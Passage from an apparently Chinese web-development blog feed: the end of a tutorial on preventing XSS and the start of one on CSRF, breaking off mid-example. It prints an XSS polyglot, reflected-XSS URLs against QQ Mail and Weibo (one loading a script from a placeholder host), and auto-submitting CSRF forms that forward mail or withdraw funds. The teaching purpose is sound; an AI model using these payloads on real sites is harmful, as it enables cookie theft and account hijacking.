Cookie。</li><li>验证码：防止脚本冒充用户提交危险操作。</li></ul><h2 id="XSS-的检测"><a href="#XSS-的检测" class="headerlink" title="XSS 的检测"></a>XSS 的检测</h2><p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？</p><p>经过一番搜索，小明找到了两个方法：</p><ol><li>使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</li><li>使用扫描工具自动检测 XSS 漏洞。</li></ol><p>在<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a>一文中，小明发现了这么一个字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:<span class="comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="comment">/* */</span>oNcliCk=alert() )<span class="comment">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></span><br></pre></td></tr></table></figure><p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>Function()</code>、<code>innerHTML</code>、<code>document.write()</code> 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p><p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;search?keyword&#x3D;jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E</span><br></pre></td></tr></table></figure><p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://github.com/Arachni/arachni">Arachni</a>、<a href="https://github.com/mozilla/http-observatory/">Mozilla HTTP Observatory</a>、<a href="https://github.com/andresriancho/w3af">w3af</a> 等。</p><h2 id="XSS-攻击的总结"><a href="#XSS-攻击的总结" class="headerlink" title="XSS 攻击的总结"></a>XSS 攻击的总结</h2><p>我们回到最开始提出的问题，相信同学们已经有了答案：</p><ol><li>XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li></ol><blockquote><p>不正确。因为： * 防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。 * 转义应该在输出 HTML 时进行，而不是在提交用户输入时。</p></blockquote><ol><li>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</li></ol><blockquote><p>不正确。 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p></blockquote><p>整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。</p><p>虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生：</p><ul><li><strong>利用模板引擎</strong> 开启模板引擎自带的 HTML 转义功能。例如： 在 ejs 中，尽量使用 <code>&lt;%= data %&gt;</code> 而不是 <code>&lt;%- data %&gt;</code>； 在 doT.js 中，尽量使用 <code>&#123;&#123;! data &#125;` 而不是 `&#123;&#123;= data &#125;`； 在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 `freemarker.core.OutputFormat`。- **避免内联事件** 尽量不要使用 `onLoad="onload('&#123;&#123;data&#125;&#125;&#39;)&quot;</code>、<code>onClick=&quot;go(&#39;&#123;&#123;action&#125;&#125;&#39;)&quot;</code> 这种拼接内联事件的写法。在 JavaScript 中通过 <code>.addEventlistener()</code> 事件绑定会更安全。</li><li><strong>避免拼接 HTML</strong> 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 <code>createElement</code>、<code>setAttribute</code> 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。</li><li><strong>时刻保持警惕</strong> 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。</li><li><strong>增加攻击难度，降低攻击后果</strong> 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。</li><li><strong>主动检测和发现</strong> 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。</li></ul><h2 id="XSS-攻击案例"><a href="#XSS-攻击案例" class="headerlink" title="XSS 攻击案例"></a>XSS 攻击案例</h2><h4 id="QQ-邮箱-m-exmail-qq-com-域名反射型-XSS-漏洞"><a href="#QQ-邮箱-m-exmail-qq-com-域名反射型-XSS-漏洞" class="headerlink" title="QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞"></a>QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞</h4><p>攻击者发现 <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code> 这个 URL 的参数 <code>uin</code>、<code>domain</code> 未经转义直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，并引导用户去点击： <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p><p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">getTop().location.href=<span class="string">&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa&quot;</span>+<span class="string">&quot;&amp;t=&quot;</span>+<span class="string">&quot;&amp;d=bbbb&quot;</span>;<span class="keyword">return</span> <span class="literal">false</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;+&quot;...</span><br></pre></td></tr></table></figure><p>浏览器接收到响应后就会执行 <code>alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p><h4 id="新浪微博名人堂反射型-XSS-漏洞"><a href="#新浪微博名人堂反射型-XSS-漏洞" class="headerlink" title="新浪微博名人堂反射型 XSS 漏洞"></a>新浪微博名人堂反射型 XSS 漏洞</h4><p>攻击者发现 <code>http://weibo.com/pub/star/g/xyyyd</code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;weibo.com&#x2F;pub&#x2F;star&#x2F;g&#x2F;xyyyd&quot;&gt;&lt;script src&#x3D;&#x2F;&#x2F;xxxx.cn&#x2F;image&#x2F;t.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://weibo.com/pub/star/g/xyyyd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxxx.cn/image/t.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;按分类检索<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器接收到响应后就会加载执行恶意脚本 <code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p><h2 id="扩展阅读：Automatic-Context-Aware-Escaping"><a href="#扩展阅读：Automatic-Context-Aware-Escaping" class="headerlink" title="扩展阅读：Automatic Context-Aware Escaping"></a>扩展阅读：Automatic Context-Aware Escaping</h2><p>上文我们说到：</p><ol><li>合适的 HTML 转义可以有效避免 XSS 漏洞。</li><li>完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。</li><li>业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。</li></ol><p>通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。</p><p>这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。</p><p>2009年，Google 提出了一个概念叫做：<a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Automatic Context-Aware Escaping</a>。</p><p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p><p>在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;.title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123;.url&#125;&#125;&quot;</span>&gt;</span>&#123;&#123;.content&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;.title | htmlescaper&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123;.url | urlescaper | attrescaper&#125;&#125;&quot;</span>&gt;</span>&#123;&#123;.content | htmlescaper&#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html">前端安全系列（一）：如何防止XSS攻击？</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://aiolimp.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>CSRF攻击</title>
    <link href="http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB/"/>
    <id>http://aiolimp.com/2021/08/12/%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB/</id>
    <published>2021-08-12T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.215Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><h3 id="CSRF漏洞的发生"><a href="#CSRF漏洞的发生" class="headerlink" title="CSRF漏洞的发生"></a>CSRF漏洞的发生</h3><p>相比XSS，CSRF的名气似乎并不是那么大，很多人都认为CSRF“不那么有破坏性”。真的是这样吗？</p><p>接下来有请小明出场~~</p><h3 id="小明的悲惨遭遇"><a href="#小明的悲惨遭遇" class="headerlink" title="小明的悲惨遭遇"></a>小明的悲惨遭遇</h3><p>这一天，小明同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意：</p><blockquote><p>甩卖比特币，一个只要998！！</p></blockquote><p>聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生……</p><p>在这平静的外表之下，黑客的攻击已然得手。小明的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到<a href="mailto:&#x68;&#97;&#99;&#x6b;&#x65;&#114;&#x40;&#104;&#97;&#99;&#x6b;&#101;&#114;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x68;&#97;&#99;&#x6b;&#x65;&#114;&#x40;&#104;&#97;&#99;&#x6b;&#101;&#114;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a>。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。</p><p>不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。</p><p>小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;https:&#x2F;&#x2F;mail.google.com&#x2F;mail&#x2F;h&#x2F;ewt1jmuj4ddv&#x2F;?v&#x3D;prf&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;cf2_emc&quot; value&#x3D;&quot;true&quot;&#x2F;&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;cf2_email&quot; value&#x3D;&quot;hacker@hakermail.com&quot;&#x2F;&gt; </span><br><span class="line">    .....</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;irf&quot; value&#x3D;&quot;on&quot;&#x2F;&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;nvp_bu_cftb&quot; value&#x3D;&quot;Create Filter&quot;&#x2F;&gt; </span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line">    document.forms[0].submit();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“<a href="mailto:&#x68;&#x61;&#99;&#x6b;&#x65;&#114;&#64;&#x68;&#97;&#x63;&#x6b;&#x65;&#114;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x68;&#x61;&#99;&#x6b;&#x65;&#114;&#64;&#x68;&#97;&#x63;&#x6b;&#x65;&#114;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a>”。</p><p>小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。</p><p>黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。</p></blockquote><p>小明很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了……</p><p>以上就是小明的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，此事件原型是2007年Gmail的CSRF漏洞：</p><p><a href="https://www.davidairey.com/google-gmail-security-hijack/">https://www.davidairey.com/google-Gmail-security-hijack/</a></p><p>当然，目前此漏洞已被Gmail修复，请使用Gmail的同学不要慌张。</p><h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><p>一个典型的CSRF攻击有着如下的流程：</p><ul><li>受害者登录a.com，并保留了登录凭证（Cookie）。</li><li>攻击者引诱受害者访问了b.com。</li><li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。</li><li>a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li><li>a.com以受害者的名义执行了act=xx。</li><li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。</li></ul><h3 id="几种常见的攻击类型"><a href="#几种常见的攻击类型" class="headerlink" title="几种常见的攻击类型"></a>几种常见的攻击类型</h3><p><strong>GET类型的CSRF</strong></p><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p><p><strong>POST类型的CSRF</strong></p><p>这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.example/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p><p><strong>链接类型的CSRF</strong></p><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">重磅消息！！</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。</p><h3 id="CSRF的特点"><a href="#CSRF的特点" class="headerlink" title="CSRF的特点"></a>CSRF的特点</h3><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><p>CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p><h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><p>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。</p><p>上文中讲了CSRF的两个特点：</p><ul><li>CSRF（通常）发生在第三方域名。</li><li>CSRF攻击者不能获取到Cookie等信息，只是使用。</li></ul><p>针对这两点，我们可以专门制定防护策略，如下：</p><ul><li>阻止不明外域的访问<ul><li>同源检测</li><li>Samesite Cookie</li></ul></li><li>提交时要求附加本域才能获取的信息<ul><li>CSRF Token</li><li>双重Cookie验证</li></ul></li></ul><p>以下我们对各种防护方法做详细说明。</p><h3 id="同源检测"><a href="#同源检测" class="headerlink" title="同源检测"></a>同源检测</h3><p>既然CSRF大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。</p><p>那么问题来了，我们如何判断请求是否来自外域呢？</p><p>在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名：</p><ul><li>Origin Header</li><li>Referer Header</li></ul><p>这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个Header中的域名，确定请求的来源域。</p><h4 id="使用Origin-Header确定来源域名"><a href="#使用Origin-Header确定来源域名" class="headerlink" title="使用Origin Header确定来源域名"></a>使用Origin Header确定来源域名</h4><p>在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。字段内包含请求的域名（不包含path及query）。</p><p>如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。</p><p>但是Origin在以下两种情况下并不存在：</p><ul><li><strong>IE11同源策略：</strong> IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#IE_Exceptions">MDN Same-origin_policy#IE_Exceptions</a></li><li><strong>302重定向：</strong> 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</li></ul><h4 id="使用Referer-Header确定来源域名"><a href="#使用Referer-Header确定来源域名" class="headerlink" title="使用Referer Header确定来源域名"></a>使用Referer Header确定来源域名</h4><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p><p>这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。</p><p>2014年，W3C的Web应用安全工作组发布了Referrer Policy草案，对浏览器该如何发送Referer做了详细的规定。截止现在新版浏览器大部分已经支持了这份草案，我们终于可以灵活地控制自己网站的Referer策略了。新版的Referrer Policy规定了五种Referer策略：No Referrer、No Referrer When Downgrade、Origin Only、Origin When Cross-origin、和 Unsafe URL。之前就存在的三种策略：never、default和always，在新标准里换了个名称。他们的对应关系如下：</p><table><thead><tr><th align="left">策略名称</th><th align="left">属性值（新）</th><th align="left">属性值（旧）</th></tr></thead><tbody><tr><td align="left">No Referrer</td><td align="left">no-Referrer</td><td align="left">never</td></tr><tr><td align="left">No Referrer When Downgrade</td><td align="left">no-Referrer-when-downgrade</td><td align="left">default</td></tr><tr><td align="left">Origin Only</td><td align="left">(same or strict) origin</td><td align="left">origin</td></tr><tr><td align="left">Origin When Cross Origin</td><td align="left">(strict) origin-when-crossorigin</td><td align="left">-</td></tr><tr><td align="left">Unsafe URL</td><td align="left">unsafe-url</td><td align="left">always</td></tr></tbody></table><p>根据上面的表格因此需要把Referrer Policy的策略设置成same-origin，对于同源的链接和引用，会发送Referer，referer值为Host不带Path；跨域访问则不携带Referer。例如：<code>aaa.com</code>引用<code>bbb.com</code>的资源，不会发送Referer。</p><p>设置Referrer Policy的方法有三种：</p><ol><li>在CSP设置</li><li>页面头部增加meta标签</li><li>a标签增加referrerpolicy属性</li></ol><p>上面说的这些比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏Referer。如果攻击者将自己的请求这样填写：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 